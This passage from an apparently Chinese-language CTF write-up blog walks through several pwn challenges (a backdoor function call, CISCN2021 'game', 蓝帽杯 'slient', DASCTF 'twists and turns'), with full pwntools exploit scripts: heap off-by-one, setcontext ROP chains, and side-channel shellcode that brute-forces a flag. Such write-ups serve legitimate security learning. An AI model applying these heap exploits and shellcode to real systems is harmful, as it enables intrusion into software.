src="https://s1.ax1x.com/2022/06/08/XrWRs0.png" alt="XrWRs0.png"></a></p><p>x86-64是小端序，所以我们看到和真实的数据是反着的，这里实际上是在比较函数名是否为<code>B4ckDo0r</code>，动态调试也可以看到</p><p><a href="https://imgtu.com/i/Xrf9Wd"><img src="https://s1.ax1x.com/2022/06/08/Xrf9Wd.png" alt="Xrf9Wd.png"></a></p><p>然后就进入到一段杂乱的代码中</p><p><a href="https://imgtu.com/i/Xr5dpQ"><img src="https://s1.ax1x.com/2022/06/08/Xr5dpQ.png" alt="Xr5dpQ.png"></a></p><p>到这里就有了第一个功能</p><p><a href="https://imgtu.com/i/Xr5rmq"><img src="https://s1.ax1x.com/2022/06/08/Xr5rmq.png" alt="Xr5rmq.png"></a></p><p>比较v89是否为save，猜测这里是比较函数名是否为save，然后进入到一大段的检测，最终save实现的功能如下</p><p><a href="https://imgtu.com/i/Xr5T76"><img src="https://s1.ax1x.com/2022/06/08/Xr5T76.png" alt="Xr5T76.png"></a></p><p>save有两个参数，都是字符串，save申请一个0x20的堆块，然后将这两个字符串分别复制到这个堆块的fd和bk上</p><p><a href="https://imgtu.com/i/XrIVjs"><img src="https://s1.ax1x.com/2022/06/08/XrIVjs.png" alt="XrIVjs.png"></a></p><p>takeaway这个功能没看懂，下一个</p><p><a href="https://imgtu.com/i/XrTgtf"><img src="https://s1.ax1x.com/2022/06/08/XrTgtf.png" alt="XrTgtf.png"></a></p><p>stealkey，将heap的值，也就是fd指针的值赋给<code>byte_204100</code></p><p>再看到fakekey</p><p><a href="https://imgtu.com/i/XrT2h8"><img src="https://s1.ax1x.com/2022/06/08/XrT2h8.png" alt="XrT2h8.png"></a></p><p><a href="https://imgtu.com/i/Xr7w5V"><img src="https://s1.ax1x.com/2022/06/08/Xr7w5V.png" alt="Xr7w5V.png"></a></p><p>获取参数的值，然后将参数值和<code>byte_204100</code>的值加起来重新赋值给heap的fd。</p><p>最后的run功能</p><p><a href="https://imgtu.com/i/XrLBw9"><img src="https://s1.ax1x.com/2022/06/08/XrLBw9.png" alt="XrLBw9.png"></a></p><p>直接调用heap，也就是heap的fd指向的函数。</p><p>我们将断点下在save功能中的malloc</p><p>此时的堆块情况如下</p><p><a href="https://imgtu.com/i/XrL9MD"><img src="https://s1.ax1x.com/2022/06/08/XrL9MD.png" alt="XrL9MD.png"></a></p><p>此时tcache中有一个0x20的chunk，所以此时使用save功能会申请这个chunk</p><p>tcache中的这个chunk出来之后，就没有合适的chunk可以直接分配了，后续就会从unsortedbin中切割chunk，这样一来就能够在fd上留下libc的地址，如下图是第二次申请来的chunk</p><p><a href="https://imgtu.com/i/XrLKsg"><img src="https://s1.ax1x.com/2022/06/08/XrLKsg.png" alt="XrLKsg.png"></a></p><p>fd上留下了libc的地址。</p><p>有了libc地址之后，我们可以调用stealkey功能将libc地址存入<code>byte_204100</code>，然后再计算出libc地址和onegadget的偏移量，调用fakekey功能，计算出onegadget的地址，将onegadget的地址存入heap的fd中，最后在调用run功能就可以执行onegadget</p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>*s1,<span class="type">char</span>*s2)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">int</span> x)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    save(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    stealkey();</span><br><span class="line">    fakekey(<span class="number">-0x2e19b4</span>);</span><br><span class="line">    run();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x4-CISCN2021-game-【逆向，off-by-one，orw】"><a href="#0x4-CISCN2021-game-【逆向，off-by-one，orw】" class="headerlink" title="0x4.CISCN2021 game 【逆向，off-by-one，orw】"></a>0x4.CISCN2021 game 【逆向，off-by-one，orw】</h2><p>程序有沙箱，main函数很简短，主要逻辑都在execute函数中</p><p><a href="https://imgtu.com/i/X6pZrt"><img src="https://s1.ax1x.com/2022/06/10/X6pZrt.png" alt="X6pZrt.png"></a></p><p>读入一段数据后，进入到execute函数中</p><p><a href="https://imgtu.com/i/X6phJe"><img src="https://s1.ax1x.com/2022/06/10/X6phJe.png" alt="X6phJe.png"></a></p><p>execute函数开头会对我们输入的cmd进行一些格式检查，如上图所示，输入开头不能为<code>\n\r</code>。接着检查cmd中是否有<code>：</code>，检测到<code>：</code>就将其设置为0，然后继续检测后面的字符中是否存在空格，\r,\n,\t这些字符，如果有的话也将它们设置为0.其他的检查也不多说了，看下面的代码</p><p><a href="https://imgtu.com/i/X6KBWR"><img src="https://s1.ax1x.com/2022/06/10/X6KBWR.png" alt="X6KBWR.png"></a></p><p><a href="https://imgtu.com/i/X2uLcR"><img src="https://s1.ax1x.com/2022/06/12/X2uLcR.png" alt="X2uLcR.png"></a></p><p>一个合法的cmd应该如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:2\nid:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&#x27;\ns:&#x27;</span>+<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;desc&gt; &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br></pre></td></tr></table></figure><p>就是，这道题自定义了一个格式，即op，id，我们需要按照它定义好的格式进行输入才能够触发各种操作。</p><p>看到init函数</p><p><a href="https://imgtu.com/i/X2M1iD"><img src="https://s1.ax1x.com/2022/06/12/X2M1iD.png" alt="X2M1iD.png"></a></p><p>传入两个参数，申请了一个0x20的chunk，指针存入heap，然后又申请了两个参数乘积大小的chunk，这里将这两个参数命名为length和width，申请出来的chunk命名为map，随后将map这篇内存清零。将length存入0x20的chunk+8处，将width存入0x20chunk+9处，将map指针存入0x20chunk开头处。</p><p>看到create函数</p><p><a href="https://imgtu.com/i/X2QC6A"><img src="https://s1.ax1x.com/2022/06/12/X2QC6A.png" alt="X2QC6A.png"></a></p><p>两个参数，index和size，首先生成一组不会大于init函数中的width和length，然后根据传入的参数size申请一块chunk，命名为heap2，往这块chunk中读入数据。接着申请一块0x30的heap1，将bk位置处设置为heap2的地址，fd位置设置为index，heap1[28]&#x3D;width,heap1[29]&#x3D;length。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*((_QWORD *)heap1 + <span class="number">2</span>) = heap[<span class="number">2</span>];</span><br><span class="line">  heap[<span class="number">2</span>] = (<span class="type">int64_t</span>)heap1;</span><br></pre></td></tr></table></figure><p>这里可以看出，程序实现了一个类似链表的结构，init函数中申请的那个0x20的chunk就相当于链表头。</p><p>看到delete函数</p><p><a href="https://imgtu.com/i/X2Q0n1"><img src="https://s1.ax1x.com/2022/06/12/X2Q0n1.png" alt="X2Q0n1.png"></a></p><p>实际上就是根据heap[2]来进行对应chunk的删除</p><p><a href="https://imgtu.com/i/X2QytO"><img src="https://s1.ax1x.com/2022/06/12/X2QytO.png" alt="X2QytO.png"></a></p><p>show函数也是同理，根据heap[2]依次输出对应chunk的值。</p><p>再看到up函数</p><p><a href="https://imgtu.com/i/X2Q21H"><img src="https://s1.ax1x.com/2022/06/12/X2Q21H.png" alt="X2Q21H.png"></a></p><p>传入1个参数，为chunk的index，根据index取到对应的chunk，然后得到其width和length，重新将v5[29]赋值为length-1，这是个啥意思呢</p><p>看下面这个图</p><p><a href="https://imgtu.com/i/X2lU58"><img src="https://s1.ax1x.com/2022/06/12/X2lU58.png" alt="X2lU58.png"></a><a href="https://imgtu.com/i/X2lBvj"><img src="https://s1.ax1x.com/2022/06/12/X2lBvj.png" alt="X2lBvj.png"></a></p><p>左边的是(length，width)，右边的是(length-1，width)，相当于坐标系里面的（x,y）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(*heap + *((<span class="type">unsigned</span> __int8 *)heap + <span class="number">9</span>) * length + width) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这句话就对应着左边这个图，将左边这个图中的这个点清0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(*((<span class="type">unsigned</span> __int8 *)heap + <span class="number">9</span>) * (length - <span class="number">1</span>) + width + *heap) = a1;</span><br></pre></td></tr></table></figure><p>这句话对应着右边这个图，即将(length-1，width)处设置为index。</p><p>后面的down，left，right也都是按照这个思路，实现了下移，左移，右移的功能。</p><p>漏洞点在于，对index上下左右位移的时候，并没有对位移的边界做出限制，可以任意移动，因此我们可以直接将index移动到某个chunk的size上，修改其size，构造off-by-one，然后申请到free_hook，使用setcontext来进行orw。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">l,w</span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:1\nl:&#x27;</span>+<span class="built_in">str</span>(l)+<span class="string">&#x27;\nw:&#x27;</span>+<span class="built_in">str</span>(w)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:2\nid:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&#x27;\ns:&#x27;</span>+<span class="built_in">str</span>(size)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;desc&gt; &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:3\nid:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    payload=<span class="string">&#x27;op:4\n&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">up</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:5\nid:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:6\nid:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:7\nid:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    payload=<span class="string">&#x27;op:8\nid:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">init(<span class="number">0x10</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x190</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002164f</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000023a6a</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ret=libc_base+<span class="number">0x00000000000008aa</span></span><br><span class="line">syscall_ret=libc_base+<span class="number">0x00000000000d2625</span></span><br><span class="line">pop_rax=libc_base+<span class="number">0x000000000001b500</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;free_hook =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free_hook)))</span><br><span class="line">log.success(<span class="string">&#x27;setcontext_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(setcontext_addr)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;4: (9,13) &#x27;</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x2161</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_bheap_basease =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">down(<span class="number">0xb1</span>)</span><br><span class="line">down(<span class="number">0xb1</span>)</span><br><span class="line">down(<span class="number">0xb1</span>)</span><br><span class="line">down(<span class="number">0xb1</span>)</span><br><span class="line">left(<span class="number">0xb1</span>)</span><br><span class="line">left(<span class="number">0xb1</span>)</span><br><span class="line">down(<span class="number">0xb1</span>)</span><br><span class="line">add(<span class="number">0x5</span>,<span class="number">0x300</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x6</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x418</span>+p64(<span class="number">0x91</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x80</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>,p64(setcontext_addr))</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rsp=heap_base+<span class="number">0x2b60</span>+<span class="number">0xb0</span></span><br><span class="line">frame.rip=ret</span><br><span class="line">payload=<span class="built_in">str</span>(frame)[:<span class="number">0xb0</span>]</span><br><span class="line">payload+=p64(pop_rdi)+p64(heap_base+<span class="number">0x2730</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall_ret)+\</span><br><span class="line">    p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x2ad0</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)+\</span><br><span class="line">        p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x2ad0</span>)+p64(pop_rdx)+p64(<span class="number">0x30</span>)+p64(pop_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x300</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x5-蓝帽杯slient-【shellcode，侧信道爆破flag】"><a href="#0x5-蓝帽杯slient-【shellcode，侧信道爆破flag】" class="headerlink" title="0x5.蓝帽杯slient 【shellcode，侧信道爆破flag】"></a>0x5.蓝帽杯slient 【shellcode，侧信道爆破flag】</h2><p>题目开了沙箱</p><p><a href="https://imgtu.com/i/XRisc8"><img src="https://s1.ax1x.com/2022/06/13/XRisc8.png" alt="XRisc8.png"></a></p><p>只能使用open和read，不能write</p><p><a href="https://imgtu.com/i/XRCnvF"><img src="https://s1.ax1x.com/2022/06/13/XRCnvF.png" alt="XRCnvF.png"></a></p><p>main函数很简短，mmap出一块内存，再读入一段0x40的数据，将这些数据存入mmap出的内存中，再执行，就是考察shellcode编写。</p><p>由于没有write，读取到flag后无法输出，这里的利用方式为shellcode盲注，也叫做侧信道攻击。先将flag读出来，然后将flag的每一位拿出来进行比较，类似于sql注入中的盲注，一位一位地得到正确的结果。</p><p>先将flag读取到栈顶，然后每次取出一个字节，对这个字节进行爆破，如果爆破成功，就使shellcode进入死循环，否则直接crash。如果shellcode进入死循环，此时就使用io.recv(timeout&#x3D;1)来进行接收的话就不会出错，而如果shellcode直接crash，io.recv(timeout&#x3D;1)就会失败，由此来判断是否匹配到了正确的flag，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BruteChar</span>(<span class="params">sh, idx, C</span>):</span><br><span class="line">    exp = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov eax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    open:</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        inc rax</span></span><br><span class="line"><span class="string">        inc rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    read_flag:</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor rax, rax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov dl, 0xff</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    brute:</span></span><br><span class="line"><span class="string">        mov al, [rsp+%d]</span></span><br><span class="line"><span class="string">        cmp al, %d</span></span><br><span class="line"><span class="string">        jnz die</span></span><br><span class="line"><span class="string">        jmp brute</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    die:</span></span><br><span class="line"><span class="string">        mov al, [0]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>%(idx, C)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.sendlineafter(<span class="string">&quot;Welcome to silent execution-box.\n&quot;</span>, asm(exp))</span><br><span class="line">        sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(flag)&lt;<span class="number">0x30</span>:</span><br><span class="line">    <span class="keyword">for</span> C <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7F</span>):</span><br><span class="line">        io=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(BruteChar(io, <span class="built_in">len</span>(flag), C)):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(C)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="0x6-2022DASCTFMAY-twists-and-turns【double-free，house-of-kiwi】"><a href="#0x6-2022DASCTFMAY-twists-and-turns【double-free，house-of-kiwi】" class="headerlink" title="0x6.2022DASCTFMAY twists and turns【double free，house of kiwi】"></a>0x6.2022DASCTFMAY twists and turns【double free，house of kiwi】</h2><p>开了沙箱，不准getshell</p><p><a href="https://imgtu.com/i/XXRZiq"><img src="https://s1.ax1x.com/2022/06/19/XXRZiq.png" alt="XXRZiq.png"></a></p><p><a href="https://imgtu.com/i/XXRQL4"><img src="https://s1.ax1x.com/2022/06/19/XXRQL4.png" alt="XXRQL4.png"></a></p><p>mmap出了一块内存，作为之后存放chunk指针的内存。</p><p><a href="https://imgtu.com/i/XXfSKS"><img src="https://s1.ax1x.com/2022/06/19/XXfSKS.png" alt="XXfSKS.png"></a></p><p>三个功能，add功能就是常规的申请一块chunk并读入一些数据，对申请的chunk的size并没有做限制。</p><p>漏洞在delete函数中</p><p><a href="https://imgtu.com/i/XXfACq"><img src="https://s1.ax1x.com/2022/06/19/XXfACq.png" alt="XXfACq.png"></a></p><p>进行删除时，只检查v1&gt;50，而v1是有符号整形，因此存在数组上溢的情况。</p><p>show功能使用puts输出chunk中的数据。</p><p>check函数检查malloc_hook和free_hook</p><p><a href="https://imgtu.com/i/XXfHMT"><img src="https://s1.ax1x.com/2022/06/19/XXfHMT.png" alt="XXfHMT.png"></a></p><p>不准我们打这俩hook</p><p>通过delete功能我们可以在fastbin中构造出double free，再通过fastbin reverse into tcache可以将double free转移到tcache中实现任意地址写(申请一个很大的chunk，比如0x30000，heap不够分配，会调用mmap来进行分配，分配在libc附近，在heap那块内存上方，事先泄露出堆地址后，就可以利用数组上溢进行double free)，有了任意地址写其实有很多方法能orw，如house of banana，又或者打IO_FILE，不过这道题出题人想考察的是house of kiwi。</p><p>house of kiwi的原理为，当调用<code>__malloc_assert</code>时，会调用fflush函数，而在fflush执行过程中，有这样一个函数调用</p><p><a href="https://imgtu.com/i/XX4fCn"><img src="https://s1.ax1x.com/2022/06/19/XX4fCn.png" alt="XX4fCn.png"></a></p><p>会调用[rbp+0x60]处的函数指针，而RBP为<code>_IO_file_jumps</code>,rdx为<code>_IO_helper_jumps</code>，在2.29以上版本中，setcontext的寄存器索引变成了rdx，如下图</p><p><a href="https://imgtu.com/i/XX5tMV"><img src="https://s1.ax1x.com/2022/06/19/XX5tMV.png" 